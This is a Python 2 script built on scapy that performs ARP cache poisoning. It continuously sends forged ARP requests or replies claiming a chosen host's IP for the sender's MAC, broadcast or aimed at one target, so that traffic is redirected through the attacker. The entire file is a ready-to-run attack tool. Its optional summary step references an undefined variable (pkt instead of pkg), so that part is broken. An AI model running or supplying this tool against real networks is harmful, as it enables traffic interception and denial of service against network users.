import os 
import sys
from scapy.all import get_if_hwaddr, getmacbyip, ARP, Ether, sendp
from optparse import OptionParser 


def main():
    try:
        if os.geteuid() != 0:
            print 'run me as root'
            sys.exit(1)
    except Exception, msg:
        print msg

    
    usage = 'Usage: %prog [-i interface] [-t target] host'

    parser = OptionParser(usage)

    parser.add_option('-i', dest='interface', help='Specify the interface to use')

    parser.add_option('-t', dest='target', help='Specify a particular host to ARP poison')

    parser.add_option('-m', dest='mode', default='req', help='Poisoning mode: requests (req) or replies (rep) [default: %default]')

    parser.add_option('-s', action='store_true', dest='summary', default=False, help='Show packet summary and ask for confirmation before poisoning')

    (options, args) = parser.parse_args()

    if len(args) !=1 or options.interface is None:
        parser.print_help()
        sys.exit(0)

    mac = get_if_hwaddr(options.interface)

    def build_req():
        if options.target is None:
            pkg = Ether(src=mac, dst='ff:ff:ff:ff:ff:ff')/ ARP(hwsrc=mac,psrc=args[0],pdst=args[0])
        elif options.target:
            target_mac = getmacbyip(options.target)
            if target_mac is None:
                print 'can not find this mac'
                sys.exit(1)
            pkg = Ether(src=mac, dst=target_mac)/ ARP(hwsrc=mac, psrc=args[0], hwdst=target_mac, pdst=options.target)
    
        return pkg

    def build_rep():
        if options.target is None:
            pkg = Ether(src=mac, dst='ff:ff:ff:ff:ff:ff')/ ARP(hwsrc=mac,psrc=args[0], op=2)
        elif options.target:
            target_mac = getmacbyip(options.target)
            if target_mac is None:
                print 'can not find this mac'
                sys.exit(1)
            pkg = Ether(src=mac, dst=target_mac)/ ARP(hwsrc=mac, psrc=args[0], hwdst=target_mac, pdst=options.target, op=2)
        return pkg

    
    if options.mode == 'req':
        pkg = build_req()
    elif options.mode == 'rep':
        pkg = build_rep()


    if options.summary is True:

        pkt.show()

        ans = raw_input('\n[*] Continue? [Y|n]: ').lower()

        if ans == 'y' or len(ans) == 0:

            pass

        else:

            sys.exit(0)

 
    

    while True:
        sendp(pkg, inter=2, iface=options.interface)



if __name__ == '__main__':
    main()
